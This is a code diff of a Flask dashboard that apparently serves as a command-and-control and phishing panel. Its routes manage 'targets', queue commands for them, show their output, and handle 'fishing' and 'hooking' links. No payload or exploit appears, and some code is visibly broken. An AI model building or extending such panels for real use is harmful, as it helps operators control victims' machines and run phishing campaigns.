@@ -1,25 +1,26 @@
-from flask import Flask,render_template,url_for,Blueprint,request,session,flash,redirect,jsonify
+from flask import render_template, url_for, Blueprint, request, session, flash, redirect
 from sqlalchemy.orm import sessionmaker
 
-from db.modle import Users,APICommand,APILink,Fishing,Hooking,Targets
-from db.mange_db import config,_create_engine
+from db.modle import Users, APICommand, APILink, Fishing, Hooking, Targets, Instraction, ApiToken
+from db.mange_db import config, _create_engine
 from utility.email_temp import email_temp
-from utility.processer import log,getlist,readFromJson
+from utility.processer import log, getlist, readFromJson, delete_data
 
 emailTemplate = email_temp()
 
 Session = sessionmaker(bind=_create_engine())
 _session = Session()
 
-view = Blueprint("view",__name__,template_folder = "templates")
+view = Blueprint("view", __name__, template_folder="templates")
+
 
 @view.route("/dashboard")
 # home page with login and singin buttons and some additional info
-def profile():
+def dashboard():
     if "email" in session:
         email = session['email']
         print(email)
-        targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(),sp=',')
+        targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
         _targets = []
         for target in targets:
             target_ = readFromJson()['target-info'][target[0]]
@@ -30,26 +31,33 @@ def profile():
             else:
                 # , mdi mdi-ethernet-cable
                 conn = 'ethernet'
-            _targets.append((target_,conn,target[0]))
+            _targets.append((target_, conn, target[0]))
 
         if request.method != 'GET':
             return redirect(url_for('event.page_404'))
-        return render_template('profile.html',targets=_targets)
+        return render_template('dashboard.html', targets=_targets)
     else:
         flash("you must login first")
         return redirect(url_for("public.login"))
 
-@view.route("/api_command/<targetName>",methods=['GET','POST'])
+
+@view.route("/api_command/<targetName>", methods=['GET', 'POST'])
 def api_command(targetName=None):
     if "email" in session:
         if targetName is not None:
             try:
                 if request.method == 'GET':
 
-                    targets = getlist(_session.query(Targets).filter_by(target_name=targetName).all(),sp=',')
-                    if len(targets) != 0:
-                        
-                        return render_template('api_command.html')
+                    targets = getlist(_session.query(Targets).filter_by(target_name=targetName).all(), sp=',')
+                    instraction = getlist(_session.query(Instraction).filter_by(target_name=targetName).all(), sp=',')
+                    if len(targets) != 0 and len(instraction) != 0:
+                        _session.query(Instraction).filter_by(target_name=targetName,instraction=config.INSTRACTION[0]).update({
+                            'stutas': config.STUTAS[0]
+                        })
+                        _session.commit()
+                        output = readFromJson()['output'][targetName]
+                        cmd = getlist(_session.query(APICommand).filter_by(target_name=targetName).all(), sp=',')
+                        return render_template('api_command.html',cmd=cmd ,output=output)
                     else:
                         flash(f'No such a target {targetName}')
                         return redirect(request.referrer)
@@ -57,11 +65,15 @@ def api_command(targetName=None):
                 elif request.method == 'POST':
 
                     CMD = request.json.get('input')
-                    add_cmd = APICommand(config.ID(n=7),session['email'],CMD,config.CMD_CONDION[False])
+                    print(targetName)
+                    add_cmd = APICommand(
+                        config.ID(n=7), session['email'],
+                        targetName, CMD, config.STUTAS[1]
+                    )
                     _session.add(add_cmd)
                     _session.commit()
 
-                    return {'message':'command saved successfully'},200
+                    return {'message': 'command saved successfully'}, 200
             
             except Exception as e:
                 print(e)
@@ -78,18 +90,33 @@ def api_command(targetName=None):
         flash("you must login first")
         return redirect(url_for("public.login"))
 
+
+@view.route('/api_command/delete',methods=['POST'])
+def delete_command():
+    if "email" in session:
+        if request.method != "POST":
+            return redirect(url_for('event.page_404'))
+        target_name = request.json.get('target_name')
+        ID = request.json.get('id')
+        deleted_data = delete_data(target_name,ID)
+
+    else:
+        flash("you must login first")
+        return redirect(url_for("public.login"))
+
+
 @view.route('/api_command/api/<targetName>')
 def api_command_(targetName):
     if "email" in session:
         try:
-            apiCommand = getlist(_session.query(APICommand).filter_by(email=session['email'],target_name=targetName).all(),sp=',')
-            return {'allCommand': apiCommand},200
+            apiCommand = getlist(_session.query(APICommand).filter_by(email=session['email'], target_name=targetName).all(), sp=',')
+            return {'allCommand': apiCommand}, 200
         
         except Exception as e:
 
             log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
             _session.rollback()
-            return {'error': 'Server side Error'},500
+            return {'error': 'Server side Error'}, 500
         
         finally:
             _session.close()
@@ -97,10 +124,22 @@ def api_command_(targetName):
         flash("you must login first")
         return redirect(url_for("public.login"))
 
-
 @view.route("/socket/<target_name>")
-def socket(target_name):
+def socket(target_name=None):
     if "email" in session:
+        if request == "POST":
+            token = request.json.get('token')
+            is_connect = request.json.get('is_connect')
+            check_token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0]
+            if token == check_token[1]:
+                ...
+        targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
+        instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(), sp=',')
+        if len(targets) != 0 and len(instraction) != 0:
+            _session.query(Instraction).filter_by(target_name=target_name,instraction=config.INSTRACTION[1]).update({
+                'stutas': config.STUTAS[0]
+            })
+        _session.commit()
         return render_template('socket.html')
     else:
         flash("you must login first")
@@ -136,10 +175,64 @@ def api_link():
             _session.close()
 
     links = _session.query(APILink).filter_by(email=session["email"]).all()
-    targetInfo = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(),sp=',')
+    targetInfo = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
     targets = [target[0] for target in targetInfo]
     print(targets)
     return render_template("api_link.html", links=links, targets=targets)
+
+
+@view.route("/api_link_delete/<ID>")
+def link_delete(ID=None):
+    if "email" in session:
+        if ID:
+            if request.method != 'GET':
+                flash(f'unknown method {request.method}')
+                return redirect(request.referrer)
+            try:
+                link = getlist(_session.query(APILink).filter_by(ID=ID).all(),sp=',')
+                print(link)
+                if link:
+                    link_ = _session.query(APILink).filter_by(ID=ID).first()
+                    _session.delete(link_)
+                    _session.commit()
+                    flash(f'deleleted sucssesfuly {link[0][3]}')
+                    return {"message": "Deleted succsessfully"},200
+            except Exception as e:
+                print(str(e))
+                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
+                return {"message": "Somting went wrong"},500
+            finally:
+                _session.close()
+        else:
+            flash('unkown link')
+            return redirect(request.referrer)
+    else:
+        flash("You must login first")
+        return redirect(url_for("public.login"))
+
+
+@view.route('/api_link_update/<ID>',methods=['POST'])
+def link_update(ID):
+    if 'email' in session:
+        if request.method == 'POST':
+            try:
+                _session.query(APILink).filter_by(ID=ID).update({
+                    'target_name': request.form['target_name'],
+                    'link': request.form['link'],
+                    'action_type': request.form['action_type']
+                })
+                _session.commit()
+                return redirect(request.referrer)
+            except Exception as e:
+                print(e)
+                _session.rollback()
+                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
+                return redirect(url_for('event.page_500'))
+        else:
+            return redirect(request.referrer)
+    else:
+        return redirect(url_for('public.login'))
+
 
 @view.route("/fishing")
 def fishing():
